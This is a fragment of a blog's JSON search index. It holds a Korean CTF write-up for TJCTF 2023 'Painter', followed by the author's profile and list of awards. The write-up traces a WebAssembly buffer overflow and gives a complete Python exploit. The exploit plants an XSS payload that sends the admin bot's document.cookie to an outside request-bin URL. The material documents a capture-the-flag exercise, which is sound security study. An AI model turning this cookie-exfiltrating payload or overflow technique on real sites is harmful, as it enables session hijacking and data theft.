\u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; if ((((local_18 \u0026lt; (*((unsigned short *) 0x24924) \u0026amp; 0xffff)) \u0026amp; 0x1) == 0x0)) break label$2; count를 overflow로 덮어서 얼마나 copy할지를 컨트롤 할 수 있다. 이때 Layer(0x2091c + 0x1008)가 pixels(0x2091c)로 4 바이트씩 copy된다.\nif ((((local_10 \u0026lt; 0x3) \u0026amp; 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)) break label$6; local_14 = local_10; 여기 if문에서 local_14가 0이 아니게 되어버리면, \u0026laquo; 0xc 때문에 0x1000 단위로 커져버린다. 여기서 if문을 안타고 들어가게 하려면 local_18은 증가하게 냅두고 그냥 payload를 넉넉하게 채우면 우회할 수 있다.\n0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 이때 적절한 count로 덮고 copy를 통해서 pixels에서 Name을 덮어버리면 나중에 loop에서 index.html의 setName을 호출해서 tick 마다 Name을 업데이트한다. const setName = () =\u0026gt; { const name = UTF8ToString(_getName()); document.getElementById(\u0026#39;name-h1\u0026#39;).innerHTML = name; } *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \u0026#34;setName()\u0026#34; */ ); 원래 flask 템플릿에서 막혀서 xss를 트리거할 수 없을텐데 Name을 덮고 wasm 단에서 바꾸게 해버리면 xss를 트리거할 수 있다.\nExploit script import base64 import requests from pwn import p8,p16 BASE_URL = \u0026#39;https://painter.tjc.tf\u0026#39; attackerURL = \u0026#39;https://qivuygm.request.dreamhack.games\u0026#39; \u0026#39;\u0026#39;\u0026#39; 0x24924 -\u0026gt; count // while loop copy cnt 0x21924 -\u0026gt; Layers 0x2191c -\u0026gt; Name 0x2091c -\u0026gt; pixels Updated every tick 0x2091c = 0x21924 \u0026#39;\u0026#39;\u0026#39; injection = f\u0026#34;\u0026lt;img src=@ onerror=window.location=\u0026#39;{attackerURL}?flag=\u0026#39;+document.cookie\u0026gt;\u0026#34; def paygen(string : bytes): \u0026#39;\u0026#39;\u0026#39; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u0026lt;\u0026lt; 0xc)) + (local_18 + 0x3))) \u0026amp; 0xff)); // 4번째 -\u0026gt; 0xff 뺴기 \u0026#39;\u0026#39;\u0026#39; pay = b\u0026#39;\u0026#39; for i in range(len(string)): if (i+1) % 4 == 0: pay += p8(0xff-string[i]) else: pay += p8(string[i]) return pay pay = b\u0026#39;\\xff\u0026#39;*(0x2191c- 0x2091c) pay += paygen(injection.encode()) pay += b\u0026#39;\\x00\u0026#39;*4 pay += b\u0026#39;\\xff\u0026#39; * ((0x24924- 0x21924)-len(pay)) # pixels overflow \u0026#39;\u0026#39;\u0026#39; export \u0026#34;copyCanvas\u0026#34;; // $func239 is exported to \u0026#34;copyCanvas\u0026#34; void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); \u0026#39;\u0026#39;\u0026#39; pay += p16(0x1000+len(injection)+4) pay += b\u0026#39;\\xff\u0026#39;*(0x70-2) # print(pay[0x1000:0x1030]) # print(hex(pay[0x3000]),hex(pay[0x3001])) # print(hex(len(pay))) re = requests.post(f\u0026#39;{BASE_URL}/save\u0026#39;, json={ \u0026#39;img\u0026#39;: base64.b64encode(pay).decode(), \u0026#39;name\u0026#39;: \u0026#39;exploit\u0026#39; }) print(re.url) admin bot한테 url주고 돌리면 flag 나온다. tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}\n","permalink":"https://Ye0ngjae.github.io/blog/tjctf_2023_painter/","summary":"painter 유사 그림판 컨셉인듯 하다. Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다. Wasm 취약점 분석은 처음 해봐서 생소했다. admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.","title":"TJCTF 2023 - Painter"},{"content":"Profile 남영재 / 2006.03.25\nOrganization Sunrin Internet High School InfoSec 117th Layer7 Hacking Club Activity 서울여자대학교 정보보호영재교육원 8기(2021.03 ~ 2021.12) 서울여자대학교 정보보호영재교육원 9기(2022.03 ~ 2022.12) 개인정보보호위원회 청소년개인정보보호리더 1기(2022.05 ~ 2022.12) Award 2024\n2024 D-Camp 청소년 창업경진대회 최우수상 2023\n선린인터넷고등학교 교내 창의아이디어 경진대회 대상 2022\n2022 임베디드 소프트웨어 경진대회 우수상 서울여자대학교 정보보호영재교육원 정보보안 경진대회 우수상 선린인터넷고등학교 교내 LogCon CTF 동상 선린인터넷고등학교 교내 디지털콘텐츠디자인대회 우수상 선린인터넷고등학교 교내 고등해커 CTF 은상 2021\n2021 인천 학생 해커톤 인천광역시교육감상 2020\n한세사이버보안고등학교 중학생 정보보안 콘테스트 동상 2020 학생 창의력 챔피언 대회 은상 ","permalink":"https://Ye0ngjae.github.io/about/","summary":"About me","title":"About me"}]